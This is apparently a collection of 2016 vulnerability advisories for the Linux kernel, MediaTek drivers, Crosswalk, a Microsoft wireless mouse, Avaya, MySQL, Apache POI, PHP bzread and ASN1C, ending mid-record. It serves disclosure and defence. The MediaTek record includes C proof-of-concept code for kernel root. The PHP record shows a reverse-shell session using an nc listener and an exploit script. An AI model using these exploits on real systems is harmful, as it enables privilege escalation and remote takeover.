This was found in Linux kernel file Linux-4.5/drivers/scsi/aacraid/commctrl.c, and crafted user space data change under race condition will lead to over-boundary access in kernel structure or local buffer, and serious consequence might be caused.
==============================================
1. Affected Versions: Linux Kernel 4.5 and earlier versions.
2. Detailed description in my report to Kernel Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116751
3. CVE: The Common Vulnerabilities and Exposures (CVE) project has assigned the entry CVE-2016-6480 to this issue.
Even though some maintainers have confirmed this issue on the mailing list, this problem has not yet been patched since my first report three months ago. I hope this could be patched as soon as possible.
Kind regards
Pengfei Wang"
2623,Elevation of Privilege Vulnerability in MediaTek Driver ( CVE-2016-6492),,CVE-2016-6492,"Details
=======
Product: MTK
platform:MT6595 -- MT6797
Security Risk: High
CVE ID: CVE-2016-6492
Credit: unLimit Security Group
Introduction
============
1.
https://github.com/jawad6233/MT6795.kernel/blob/1251b008a51be5cd97ce6da916f34fc6afa2b1d7/alps/kernel-3.10/drivers/misc/mediatek/mach/mt6795/camera_fdvt.c#L415
ioctl cmd MT6573FDVTIOC_T_SET_FDCONF_CMD
functon: MT6573 FDVT set reg to HW buffer (MT6573FDVT_SetRegHW)
2.
Vulnerability Detail:
static int MT6573FDVT_SetRegHW(MT6573FDVTRegIO * a_pstCfg)
{
MT6573FDVTRegIO *pREGIO = NULL;
u32 i=0;
static UINT8 illegalWRLogTimes = 0;
if (NULL == a_pstCfg) {
LOG_DBG(""Null input argrment "");
return -EINVAL;
}
pREGIO = (MT6573FDVTRegIO*)a_pstCfg;
if(copy_from_user((void*)pMT6573FDVTWRBuff.u4Addr, (void *) pREGIO->pAddr, pREGIO->u4Count * sizeof(u32))) { // pREGIO->u4Count Length not check&#65292;cause any address writeable. if pREGIO-> u4Count control within the effective range, pREGIO-> pAddr can be written to the specified location
LOG_DBG(""ioctl copy from user failed "");
return -EFAULT;
}
if(copy_from_user((void*)pMT6573FDVTWRBuff.u4Data, (void *) pREGIO->pData, pREGIO->u4Count * sizeof(u32))) {
LOG_DBG(""ioctl copy from user failed "");
return -EFAULT;
}
//pMT6573FDVTWRBuff.u4Counter=pREGIO->u4Count;
//LOG_DBG(""Count = %d "", pREGIO->u4Count);
for( i = 0; i < pREGIO->u4Count; i++ ) {
if ((FDVT_ADDR + pMT6573FDVTWRBuff.u4Addr[i]) >= FDVT_ADDR && (FDVT_ADDR + pMT6573FDVTWRBuff.u4Addr[i]) <= (FDVT_ADDR + FDVT_MAX_OFFSET))
{
//LOG_DBG(""write addr = 0x%08x, data = 0x%08x "", FDVT_ADDR + pMT6573FDVTWRBuff.u4Addr[i], pMT6573FDVTWRBuff.u4Data[i]);
FDVT_WR32(pMT6573FDVTWRBuff.u4Data[i], FDVT_ADDR + pMT6573FDVTWRBuff.u4Addr[i] );
}
else
{
if(illegalWRLogTimes < 10)
{
LOG_DBG(""Error: Writing Memory(0x%8x) Excess FDVT Range! "", (unsigned int)(FDVT_ADDR + pMT6573FDVTWRBuff.u4Addr[i]));
illegalWRLogTimes ++;
}
else if(illegalWRLogTimes == 10)
{
LOG_DBG(""Error: Writing Memory Excess FDVT Range - Log Too Much, Stop Same Logs"");
illegalWRLogTimes ++;
}
else{}
}
}
return 0;
}
3.POC:
/*
* Abuse it for root shell
*/
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include <sys/mount.h>
#include <dirent.h>
#ifndef MAX_BUFFER_SIZE
#define MAX_BUFFER_SIZE 512
#endif
typedef struct
{
unsigned int *pAddr;
unsigned int *pData;
unsigned int u4Count;
} MT6573FDVTRegIO;
#define FDVT_IOC_MAGIC 'N'
#define MT6573FDVTIOC_T_SET_FDCONF_CMD _IOW(FDVT_IOC_MAGIC, 0x03, MT6573FDVTRegIO)
const static char *driver = ""/dev/camera-fdvt"";
void set_fdconf_cmd()
{
int fd = 0;
MT6573FDVTRegIO argc;


fd = open(driver, O_RDWR);

if (fd < 0)
{
printf(""Failed to open %s, with errno %s "", driver, strerror(errno));
system(""echo 1 > /data/local/tmp/log"");
exit(EXIT_FAILURE);
}

argc.pAddr = 0x1024;
argc.pData = 0x1024;
argc.u4Count = 0x1024;

if(ioctl(fd, MT6573FDVTIOC_T_SET_FDCONF_CMD, &argc) < 0)
{
printf(""Allocation of structs failed, %s "", strerror(errno));
system(""echo 2 > /data/local/tmp/log"");
exit(EXIT_FAILURE);
}

close(fd);
}
int main(int argc, char **argv, char **env) {
set_fdconf_cmd();
return 0;
}"
2625,CVE-2016-5672: Intel Crosswalk SSL Prompt Issue,,CVE-2016-5672,"[Original at: https://wwws.nightwatchcybersecurity.com/2016/07/29/advisory-intel-crosswalk-ssl-prompt-issue/]
Summary
The Intel Crosswalk Project library for cross-platform mobile
development did not properly handle SSL errors. This behaviour could
subject applications developed using this library to SSL MITM attacks.
Vulnerability Details
The Crosswalk Project, created by Intel�s Open Source Technology
Center, allows mobile developers to use HTML, CSS and Javascript to
develop and deploy mobile apps across multiple platforms from the same
codebase. The library packages the HTML assets provided by the
developer and runs them inside a WebView on the device. The library
also bridges some of the common APIs and services from the Javascript
code in the WebView to the underlying platform. The project supports
deployment to iOS, Windows Phone and Android. It is implemented in
multiple apps, some of which can be found here.
For the Android implementation of CrossWalk � when an invalid or
self-signed SSL certificate is used during communication with the
server, the underlying library displays a prompt to the user asking
them to grant permission or deny permission to this certificate. If
the user allows the certificate, that choice is remembered going
forward and from that point in, all subsequent requests with invalid
SSL certificates are accepted by the application, and are not
rechecked. This applies even to connections over different WiFi
hotspots and different certificates. This may allow a network-level
attacker to mount MITM attack using invalid SSL certificate and
capture sensitive data.
Example of error dialog
The fix changes the behaviour to generate a programmatic error message
not visible to the user about an invalid SSL certificate. This issue
has been fixed in the following versions of Crosswalk and all users of
the library are encouraged to upgrade:
- 19.49.514.5 (stable)
- 20.50.533.11 (beta)
- 21.51.546.0 (beta)
- 22.51.549.0 (canary)
This issue was originally discovered while testing a third-party
Android app using this library.
References
CERT/CC vulnerability note:
https://www.kb.cert.org/vuls/id/217871
Crosswalk security advisory:
https://lists.crosswalk-project.org/pipermail/crosswalk-help/2016-July/002167.html
CVE - CVE-2016-5672:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5672
Intel blog post:
https://blogs.intel.com/evangelists/2016/07/28/crosswalk-security-vulnerability/
Credits
Thank you to CERT/CC for coordination on this issue, and to the Intel
Open Source Technology Center for the fix.
Timeline
2016-05-25: Reported issue to the Intel PSIRT, got an automated reply
2016-05-30: Reached out to CERT/CC for help reaching Intel
2016-06-01: Request from CERT/CC for more details, provided details
via secure form
2016-06-15: Response from CERT/CC that Intel is planning a fix within 45 days
2016-06-23: Direct contact from Intel
2016-07-01: Asking CERT/CC to reserve a CVE, CERT/CC assigns a CVE
2016-07-22: Intel fix is finished and ready for testing
2016-07-25: We confirm the fix and coordinate disclosure dates
2016-07-29: Coordinated public disclosure"
2629,[SYSS-2016-059] Microsoft Wireless Desktop 2000 - Insufficient Verification of Data Authenticity (CWE-345),CWE-345,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-059
Product: Microsoft Wireless Desktop 2000
Manufacturer: Microsoft
Affected Version(s): Ver. A
Tested Version(s): Ver. A
Vulnerability Type: Insufficient Verification of Data Authenticity (CWE-345)
Mouse Spoofing Attack
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2016-06-28
Solution Date: -
Public Disclosure: 2016-07-29
CVE Reference: Not yet assigned
Authors of Advisory: Matthias Deeg and Gerhard Klostermeier (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Microsoft Wireless Desktop 2000 is a wireless desktop set consisting of
a mouse and a keyboard.
The manufacturer describes the product as follows (see [1]):
""This keyboard features Advanced Encryption Standard (AES) technology,
which is designed to help protect your information by encrypting your
keystrokes. Each keyboard is permanently paired with its receiver at
the factory - no key information is ever shared over the air.""
Due to unencrypted and unauthenticated mouse data communication, the
wireless desktop set Microsoft Wireless Desktop 2000 is prone to mouse
spoofing attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH found out that the mouse of the wireless desktop set
Microsoft Wireless Desktop 2000 is prone to spoofing attacks, as the
mouse data communication is unencrypted and unauthenticated.
An attacker can analyze the unencrypted mouse data packets of the 2.4
GHz radio communication sent by the mouse to the receiver (USB dongle)
in order to learn the used protocol. By knowing the used mouse data
protocol, it is possible to spoof mouse actions like mouse movements or
mouse clicks by sending forged data packets.
Thus, an attacker is able to remotely control the mouse pointer of a
target system that is operated with the wireless desktop set Microsoft
Wireless Desktop 2000. If the graphical user interface of the victim's
system is unlocked, an attacker can for example send a list of mouse
actions that start the virtual on-screen keyboard of the operating
system and execute arbitrary commands in the context of the currently
logged in user, for instance a download and execute attack vector.
As the attacker may not have an unobstructed view to the target system's
screen and may know the used operating system, the screen resolution, or
the current mouse settings, this kind mouse spoofing attack is based on
heuristics. But concerning an unlocked and unattended system, an
attacker can simply try different attack vectors for different target
system configurations sequentially.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The SySS GmbH could successfully perform mouse spoofing attacks against
a target system operated with the wireless desktop set Microsoft
Wireless Desktop 2000 using an in-house developed software tool in
combination with the USB radio dongle Crazyradio PA (see [2]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The manufacturer Microsoft responded to the reported security issue that
this behavior is by design and that there will be no security update.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-06-28: Vulnerability reported to manufacturer
2016-06-28: Manufacturer acknowledges e-mail with SySS security advisory
2016-07-22: Statement from manufacturer concerning reported security
issue
2016-07-29: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Microsoft Wireless Desktop 2000
https://www.microsoft.com/accessories/en-us/products/keyboards/wireless-desktop-2000/m7j-00001
[2] Product website for Crazyradio PA
https://www.bitcraze.io/crazyradio-pa/
[3] SySS Security Advisory SYSS-2016-059
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-059.txt
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg and Gerhard
Klostermeier of the SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCgAGBQJXmzkcAAoJENmkv2o0rU2rGccP/0SAO/VCPoEYcvjVE59xzv3R
np/AlWiBrVxpXYlZanXeVsX/Te+MeueoQGirM9AdotP/4JWa9JIT6BeH0SX/VT7V
oSUkVlr/KmHWb2iN0BAgj/szq8rMisvrXt2MOeH3no3OCL34vJH+bIZnuXp8Es51
sFFjynfVZ5Xk14IeQbtyoCPmlsgCNYdLNB2Xp7W8qpkGt5bHGu+GLgIbj6RunCCR
Pblua+BBlyl/ipvFUPR6vAGgOqCotQpa4Oou9/OKgZlSd/LMYqyLV16cizZHAPxX
Se2MYIJkzs+DErbsFzCkMsXAM2oUl3eSzdPrnXReW1Df58UGgrJEeG6MLOIDOvMH
EgKOJd+zUbwsu//e+ZOr0rkKuO8TPFWZWc2YCbeEP+z2SGs/kujsp59PmxL43pER
8pLcPtOa27HNW+LChV0xZv67D219dQ+kaYXbJLulwTZhKCpG692cs88hpHah0QQB
rjsqT0Q1uxmRtdr80WXbJPjkwsKbZ/eOqKxcl/Pdw1RwwfdqLjGBdyAZQs8/aska
WU7m+4CUGgB9Az2wOLzn6BjRgjTsGhEskcSdQBv4BcL5DgygCTE5zBWtb5fsJgd0
T4wajMW031H5XOWQlZwNluuswIzaomXusG4mQlOZIDCXBOH1lqpTT0lGviqqxAnT
F0sDbPUzt6R/+hwb6Flh
=1fVa
-----END PGP SIGNATURE-----"
2642,CVE-2016-2783 - Avaya VOSS/VSP Release 4.1.0.0 Vulnerable to SPB Traffic traversal,,CVE-2016-2783,"Virtual Services Platform (VOSS) Security Vulnerability CVE-2016-2783 - Release 4.1.0.0 Vulnerable to SPB Traffic traversal
Avaya Networking was notified by Kryptos Logic and Stora, that Avaya VSP (VOSS) 4.1.0.0 has security vulnerability on November 30, 2015. Avaya R&D has confirmed the existence and the fix is available.
CVSS v2 Base Score = 6.4 (Medium)
Vector: (AV:A/AC:M/Au:N/C:N/I:P/A:C)
Impact Subscore: = 7.8
Exploitability Subscore: 5.5
CVSS Temporal Score = 5.3 (Medium)
Vector: (E:F/RL:OF/RC:C)
CVSS Environmental Score depends on actual customer deployments.
The Avaya Fabric Connect VSP, under specific conditions, can accept and process specially crafted and spoofed Ethernet frames, which can lead to unauthorized access to devices intended to be secured from untrusted traffic sources. The vulnerability is caused by mishandling VLAN and I-SID indexes within the Fabric infrastructure.
There are no known public exploits of this vulnerability. There is no work around.
A mandatory upgrade to the release that contains the fix is required. Remaining on releases prior to 4.2.3.0, 5.0.1.0 and 5.1.0.0 is at the customers' own risk.
Upgrade links are:
For release stream 4.2.2.x and prior: upgrade to 4.2.3.0 containing the fix.
For release stream 5.0.x.x: upgrade to 5.0.1.0 containing the fix.
Release stream 5.1.0.0 already contains the fix.
Release 4.2.3.0:
Virtual Services Platform 4000 Series v4.2.3
https://support.avaya.com/downloads/download-details.action?contentId=C20162262223122520_4&productId=P1440
Virtual Services Platform 7200 Series v4.2.3
https://support.avaya.com/downloads/download-details.action?contentId=C20162262235297210_0&productId=P1603
Virtual Services Platform 8000 Series v4.2.3
https://support.avaya.com/downloads/download-details.action?contentId=C2016226225599430_4&productId=P1465
Release 5.0.1.0:
Virtual Services Platform 4000 Series v5.0.1
https://support.avaya.com/downloads/download-details.action?contentId=C2016432012359140_8&productId=P1440
Virtual Services Platform 7200 Series v5.0.1
https://support.avaya.com/downloads/download-details.action?contentId=C2016431947494000_2&productId=P1603
Virtual Services Platform 8000 Series v5.0.1
https://support.avaya.com/downloads/download-details.action?contentId=C2016431933124770_7&productId=P1465
Release 5.1.0.0:
Virtual Services Platform 4000 Series v5.1
https://support.avaya.com/downloads/download-details.action?contentId=C201633102127650_3&productId=P1440
Virtual Services Platform 7200 Series v5.1
https://support.avaya.com/downloads/download-details.action?contentId=C2016331037409820_9&productId=P1603
Virtual Services Platform 8000 Series v5.0.1
https://support.avaya.com/downloads/download-details.action?contentId=C2016331051378280_7&productId=P1465
Credits
This vulnerability was discovered as a joint effort by the team:
Jason Ostrom, Stora
Salim Neino, Kryptos Logic
Samuel Neves, Kryptos Logic
Dragan"
2657,MySQL 0days followup (CVE-2016-3477) CVSS 8.1,,CVE-2016-3477,"Among other issues reported, the most critical flaw in the July CPU 2016, rated CVSS v3.0 base score 8.1, is the Server Parser subcomponent issue(CVE-2016-3477) and one of our findings.
Versions 5.5.49 and earlier, 5.6.30 and earlier, and 5.7.12 and earlier are affected. The zero-day permits unauthenticated users with login access to the infrastructure where MySQL Server executes to successfully compromise and take over the database server.
https://www.exploit-db.com/docs/40143.pdf"
2678,[CVE-2016-5000] XML External Entity (XXE) Vulnerability in Apache POI's XLSX2CSV Example,,CVE-2016-5000,"CVE-2016-5000: XML External Entity (XXE) Vulnerability in Apache POI's XLSX2CSV Example
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: POI 3.5-3.13
Description:
Apache POI's XLSX2CSV example uses Java's XML components to parse OpenXML files. Applications and users that use XLSX2CSV and accept such files from end-users are vulnerable to XML External Entity (XXE) attacks, which allow remote attackers to bypass security restrictions and read arbitrary files via a crafted OpenXML document that provides an XML external entity declaration in conjunction with an entity reference.
Mitigation: Upgrade to 3.14 or higher
Credit: This issue was discovered by Mauro Gentile of Minded Security."
2687,CVE-2016-5399: php: out-of-bounds write in bzread(),,CVE-2016-5399,"PHP 7.0.8, 5.6.23 and 5.5.37 does not perform adequate error handling in
its `bzread()' function:
php-7.0.8/ext/bz2/bz2.c
,----
| 364 static PHP_FUNCTION(bzread)
| 365 {
| ...
| 382 ZSTR_LEN(data) = php_stream_read(stream, ZSTR_VAL(data), ZSTR_LEN(data));
| 383 ZSTR_VAL(data)[ZSTR_LEN(data)] = '';
| 384
| 385 RETURN_NEW_STR(data);
| 386 }
`----
php-7.0.8/ext/bz2/bz2.c
,----
| 210 php_stream_ops php_stream_bz2io_ops = {
| 211 php_bz2iop_write, php_bz2iop_read,
| 212 php_bz2iop_close, php_bz2iop_flush,
| 213 ""BZip2"",
| 214 NULL, /* seek */
| 215 NULL, /* cast */
| 216 NULL, /* stat */
| 217 NULL /* set_option */
| 218 };
`----
php-7.0.8/ext/bz2/bz2.c
,----
| 136 /* {{{ BZip2 stream implementation */
| 137
| 138 static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t count)
| 139 {
| 140 struct php_bz2_stream_data_t *self = (struct php_bz2_stream_data_t *)stream->abstract;
| 141 size_t ret = 0;
| 142
| 143 do {
| 144 int just_read;
| ...
| 148 just_read = BZ2_bzread(self->bz_file, buf, to_read);
| 149
| 150 if (just_read < 1) {
| 151 stream->eof = 0 == just_read;
| 152 break;
| 153 }
| 154
| 155 ret += just_read;
| 156 } while (ret < count);
| 157
| 158 return ret;
| 159 }
`----
The erroneous return values for Bzip2 are as follows:
bzip2-1.0.6/bzlib.h
,----
| 038 #define BZ_SEQUENCE_ERROR (-1)
| 039 #define BZ_PARAM_ERROR (-2)
| 040 #define BZ_MEM_ERROR (-3)
| 041 #define BZ_DATA_ERROR (-4)
| 042 #define BZ_DATA_ERROR_MAGIC (-5)
| 043 #define BZ_IO_ERROR (-6)
| 044 #define BZ_UNEXPECTED_EOF (-7)
| 045 #define BZ_OUTBUFF_FULL (-8)
| 046 #define BZ_CONFIG_ERROR (-9)
`----
Should the invocation of BZ2_bzread() fail, the loop would simply be
broken out of (bz2.c:152) and execution would continue with bzread()
returning RETURN_NEW_STR(data).
According to the manual [1], bzread() returns FALSE on error; however
that does not seem to ever happen.
Due to the way that the bzip2 library deals with state, this could
result in an exploitable condition if a user were to call bzread() after
an error, eg:
,----
| $data = """";
| while (!feof($fp)) {
| $res = bzread($fp);
| if ($res === FALSE) {
| exit(""ERROR: bzread()"");
| }
| $data .= $res;
| }
`----
Exploitation
============
One way the lack of error-checking could be abused is through
out-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread()
-> BZ2_bzRead() -> BZ2_bzDecompress() -> BZ2_decompress()) processes the
`pos' array using user-controlled selectors as indices:
bzip2-1.0.6/decompress.c
,----
| 106 Int32 BZ2_decompress ( DState* s )
| 107 {
| 108 UChar uc;
| 109 Int32 retVal;
| ...
| 113 /* stuff that needs to be saved/restored */
| 114 Int32 i;
| 115 Int32 j;
| ...
| 118 Int32 nGroups;
| 119 Int32 nSelectors;
| ...
| 167 /*restore from the save area*/
| 168 i = s->save_i;
| 169 j = s->save_j;
| ...
| 172 nGroups = s->save_nGroups;
| 173 nSelectors = s->save_nSelectors;
| ...
| 195 switch (s->state) {
| ...
| 286 /*--- Now the selectors ---*/
| 287 GET_BITS(BZ_X_SELECTOR_1, nGroups, 3);
| 288 if (nGroups < 2 || nGroups > 6) RETURN(BZ_DATA_ERROR);
| 289 GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15);
| 290 if (nSelectors < 1) RETURN(BZ_DATA_ERROR);
| 291 for (i = 0; i < nSelectors; i++) {
| 292 j = 0;
| 293 while (True) {
| 294 GET_BIT(BZ_X_SELECTOR_3, uc);
| 295 if (uc == 0) break;
| 296 j++;
| 297 if (j >= nGroups) RETURN(BZ_DATA_ERROR);
| 298 }
| 299 s->selectorMtf[i] = j;
| 300 }
| 301
| 302 /*--- Undo the MTF values for the selectors. ---*/
| 303 {
| 304 UChar pos[BZ_N_GROUPS], tmp, v;
| 305 for (v = 0; v < nGroups; v++) pos[v] = v;
| 306
| 307 for (i = 0; i < nSelectors; i++) {
| 308 v = s->selectorMtf[i];
| 309 tmp = pos[v];
| 310 while (v > 0) { pos[v] = pos[v-1]; v--; }
| 311 pos[0] = tmp;
| 312 s->selector[i] = tmp;
| 313 }
| 314 }
| 315
| ...
| 613 save_state_and_return:
| 614
| 615 s->save_i = i;
| 616 s->save_j = j;
| ...
| 619 s->save_nGroups = nGroups;
| 620 s->save_nSelectors = nSelectors;
| ...
| 640 return retVal;
| 641 }
`----
bzip2-1.0.6/decompress.c
,----
| 070 #define GET_BIT(lll,uuu)
| 071 GET_BITS(lll,uuu,1)
`----
bzip2-1.0.6/decompress.c
,----
| 043 #define GET_BITS(lll,vvv,nnn)
| 044 case lll: s->state = lll;
| 045 while (True) {
| ...
| 065 }
`----
If j >= nGroups (decompress.c:297), BZ2_decompress() would save its
state and return BZ_DATA_ERROR. If the caller don't act on the
erroneous retval, but rather invokes BZ2_decompress() again, the saved
state would be restored (including `i' and `j') and the switch statement
would transfer execution to the BZ_X_SELECTOR_3 case -- ie. the
preceding initialization of `i = 0' and `j = 0' would not be executed.
In pseudocode it could be read as something like:
,----
| i = s->save_i;
| j = s->save_j;
|
| switch (s->state) {
| case BZ_X_SELECTOR_2:
| s->state = BZ_X_SELECTOR_2;
|
| nSelectors = get_15_bits...
|
| for (i = 0; i < nSelectors; i++) {
| j = 0;
| while (True) {
| goto iter;
| case BZ_X_SELECTOR_3:
| iter:
| s->state = BZ_X_SELECTOR_3;
|
| uc = get_1_bit...
|
| if (uc == 0) goto done;
| j++;
| if (j >= nGroups) {
| retVal = BZ_DATA_ERROR;
| goto save_state_and_return;
| }
| goto iter;
| done:
| s->selectorMtf[i] = j;
`----
An example selector with nGroup=6:
,----
| 11111111111110
| ||||| `|||||| `- goto done; s->selectorMtf[i] = 13;
| `´ j++;
| j++; goto save_state_and_return;
| goto iter;
`----
Since the selectors are used as indices to `pos' in the subsequent loop,
an `nSelectors' amount of <= 255 - BZ_N_GROUPS bytes out-of-bound writes
could occur if BZ2_decompress() is invoked in spite of a previous error.
bzip2-1.0.6/decompress.c
,----
| 304 UChar pos[BZ_N_GROUPS], tmp, v;
| 305 for (v = 0; v < nGroups; v++) pos[v] = v;
| 306
| 307 for (i = 0; i < nSelectors; i++) {
| 308 v = s->selectorMtf[i];
| 309 tmp = pos[v];
| 310 while (v > 0) { pos[v] = pos[v-1]; v--; }
| 311 pos[0] = tmp;
| 312 s->selector[i] = tmp;
| 313 }
`----
bzip2-1.0.6/bzlib_private.h
,----
| 121 #define BZ_N_GROUPS 6
`----
PoC
===
Against FreeBSD 10.3 amd64 with php-fpm 7.0.8 and nginx from the
official repo [2]:
,----
| $ nc -v -l 1.2.3.4 5555 &
| Listening on [1.2.3.4] (family 0, port 5555)
|
| $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php
| [*] sending archive to http://target/upload.php (0)
|
| Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 49479)
| $ fg
| id
| uid=80(www) gid=80(www) groups=80(www)
|
| uname -imrsU
| FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000
|
| /usr/sbin/pkg query -g ""=> %n-%v"" php*
| => php70-7.0.8
| => php70-bz2-7.0.8
|
| cat upload.php
| <?php
| $fp = bzopen($_FILES[""file""][""tmp_name""], ""r"");
| if ($fp === FALSE) {
| exit(""ERROR: bzopen()"");
| }
|
| $data = """";
| while (!feof($fp)) {
| $res = bzread($fp);
| if ($res === FALSE) {
| exit(""ERROR: bzread()"");
| }
| $data .= $res;
| }
| bzclose($fp);
| ?>
`----
Solution
========
This issue has been assigned CVE-2016-5399 and can be mitigated by
calling bzerror() on the handle between invocations of bzip2.
Another partial solution has been introduced in PHP 7.0.9 and 5.5.38,
whereby the stream is marked as EOF when an error is encountered;
allowing this flaw to be avoided by using feof(). However, the PHP
project considers this to be an issue in the underlying bzip2
library[3].
Footnotes
_________
[1] [https://secure.php.net/manual/en/function.bzread.php]
[2] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-5399]
[3] [https://bugs.php.net/bug.php?id=72613]
--
Hans Jerry Illikainen"
2697,CVE-2016-5080: Memory corruption in code generated by Objective Systems Inc. ASN1C compiler for C/C++ [STIC-2016-0603],,CVE-2016-5080,"Fundación Dr. Manuel Sadosky - Programa STIC Advisory
www.fundacionsadosky.org.ar
Heap memory corruption in ASN.1 parsing code generated by Objective
Systems Inc. ASN1C compiler for C/C++
1. *Advisory Information*
Title: Heap memory corruption in ASN.1 parsing code generated by
Objective Systems Inc. ASN1C compiler for C/C++
Advisory ID: STIC-2016-0603
Advisory URL: http://www.fundacionsadosky.org.ar/publicaciones-2
Date published: 2016-07-18
Date of last update: 2016-07-19
Vendors contacted: Objective Systems Inc.
Release mode: Coordinated release
2. *Vulnerability Information*
Class: Heap-based Buffer Overflow [CWE-122]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: Yes
CVE Identifier: CVE-2016-5080
3. *Vulnerability Description*
Abstract Syntax Notation One (ASN.1) is a technical standard and formal
notation that describes rules and structures for representing, encoding,
transmitting, and decoding data in telecommunications and computer
networking[1]. It is a joint standard of the International Organization
for Standardization (ISO), International Electrotechnical Commission
(IEC), and International Telecommunication Union Telecommunication
Standardization Sector ITU-T[2] used in technical standards for wireless
communications such as GSM, UMTS and LTE, Lawful Interception,
Intelligent Transportation Systems, signalling in fixed and mobile
telecommunications networks (SS7), wireless broadband access (WiMAX),
data security (X.509), network management (SNMP), voice over IP and
IP-based videoconferencing (H.323), manufacturing, aviation, aerospace
and several other areas[3].
Software components that generate, transmit and parse ASN.1 encoded data
constitute a critical building block of software that runs on billions
of mobile devices, telecommunication switching equipment and systems for
operation and management of critical infrastructures. The ASN.1
specification is sufficiently complicated to make writing programs that
parse ASN.1 encoded data a perilious and error-prone activity. Many
technology vendors have adopted the practice of using computer-generated
programs to parse ASN.1 encoded data. This is accomplished by using an
ASN.1 compiler, a software tool that given as input a data specification
written in ASN.1 generates as output the source code of a program that
can be used to encode and decode in compliance with the specification.
The output of an ASN.1 compiler is generally incorporated as a building
block in a software system that transmits or processes ASN.1 encoded data.
Objective Systems Inc. is a US-based private company[5] that develops
and commercializes ASN1C, a ASN1 compiler for various programming
languages, to vendors in the telecommunications, data networking,
aviation, aerospace, defense and law enforcement sectors[6].
A vulnerability found in the runtime support libraries of the ASN1C
compiler for C/C++ from Objective Systems Inc. could allow an attacker
to remotely execute code in software systems, including embedded
software and firmware, that use code generated by the ASN1C compiler.
The vulnerability could be triggered remotely without any authentication
in scenarios where the vulnerable code receives and processes ASN.1
encoded data from untrusted sources, these may include communications
between mobile devices and telecommunication network infrastructure
nodes, communications between nodes in a carrier's network or across
carrier boundaries, or communication between mutually untrusted
endpoints in a data network.
Objective Systems Inc. has addressed the issue and built a fixed interim
version of the ASN1C for C/C++ compiler that is a available to customers
upon request. The fixes will be incorporated in the next (v7.0.2)
release of ASN1C for C/C++.
For further information about vulnerable vendors and available fixes
refer to the CERT/CC vulnerability note [4].
4. *Vulnerable packages*
Software systems that use ASN.1 parsing code generated with Objective
Systems Inc. ASN1C compiler for C/C++ version 7.0 or below. Refer to the
CERT/CC vulnerability note[4] for a list of potentially affected vendors.
5. *Vendor Information, Solutions and Workarounds*
Vendor fixed the issue in an interim release of the ASN1C v7.0.1
compiler available to customers upon request[5]. The upcoming ASN1C
v7.0.2 release will incorporate the fixes.
6. *Credits*
This vulnerability was discovered and researched by Lucas Molas. The
publication of this advisory was coordinated by Programa Seguridad en TIC.
7. *Technical Description*
This document details a bug found in the latest release of Objective
Systems Inc,. ASN1C compiler for C/C++ (v7.0.0), particularly in the
'rtxMemHeapAlloc' function contained in the pre-compiled 'asn1rt_a.lib'
library, where two integer overflows have been detected, which could
lead to corruption of heap memory in an attacker-controlled scenario.
The component analyzed was the ""evaluation package of ASN1C"" (v7.0.0)
for Windows (x86) MSVC 32-bit, but the analysis also applies to other
platforms. The analysis was performed with the IDA (v6.9) disassembler,
from which the assembly blocks shown below have been extracted (the
assembly syntax and location addresses may vary).
The pre-compiled library analyzed, 'asn1rt_a.lib', was extracted from
